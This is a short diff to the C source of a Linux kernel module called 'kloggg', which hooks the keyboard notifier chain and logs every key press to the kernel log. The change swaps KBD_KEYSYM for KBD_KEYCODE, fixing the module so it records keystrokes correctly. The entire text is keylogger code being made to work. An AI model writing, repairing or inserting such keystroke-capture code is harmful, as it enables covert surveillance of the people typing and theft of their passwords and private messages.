@@ -63,7 +63,7 @@ static const char *keycode_names[KEY_MAX + 1] = {
 static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
   struct keyboard_notifier_param *param = data;
 
-  if (action == KBD_KEYSYM && param->down) {
+  if (action == KBD_KEYCODE && param->down) {
     if (param->value <= KEY_MAX && keycode_names[param->value])
       printk(KERN_INFO "kloggg: key = %s\n", keycode_names[param->value]);
     else
